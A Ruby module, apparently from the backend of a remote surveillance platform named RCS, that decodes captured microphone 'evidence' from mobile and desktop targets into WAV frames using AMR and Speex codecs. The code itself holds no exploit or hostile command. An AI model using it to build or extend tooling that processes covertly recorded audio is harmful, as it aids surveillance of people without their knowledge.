require 'stringio'

require_relative '../libs/amr/amr'
require_relative '../libs/speex/speex'
require_relative '../call_processor'
require_relative 'audio_evidence'

module RCS
module MicProcessing
  extend AudioEvidence

  attr_reader :wav

  def end_call?
    self[:data][:grid_content].bytesize == 4 and self[:data][:grid_content] == "\xff\xff\xff\xff"
  end

  def process
    self[:wav] = []
    return if self[:data][:grid_content].nil?

    # AMR encoding uses the first bit to signal it
    if self[:data][:sample_rate] & LOG_AUDIO_AMR == 1
      codec = :amr
      # clear codec bit if set
      self[:data][:sample_rate] &= ~LOG_AUDIO_AMR
    elsif self[:data][:sample_rate] == 8000
      # SPEEX for mobile is recorded at 8 KHz
      codec = :speex_mobile
    elsif [44100, 48000].include? self[:data][:sample_rate]
      # SPEEX for desktop is recorded at 44100 or 48000
      codec = :speex
    end

    # speex decode
    data = self[:data][:grid_content]
    case codec
      when :speex
        self[:wav] = Speex.get_wav_frames(data, Speex::MODEID_UWB)
      when :speex_mobile
        self[:wav] = Speex.get_wav_frames(data, Speex::MODEID_NB)
      when :amr
        self[:wav] = AMR.get_wav_frames data
    end

    #trace :debug, "Sample rate: #{self[:data][:sample_rate]} | data: #{data.size} | wav: #{self[:wav].size}"
  end

  def type
    :mic
  end

end
end # RCS::
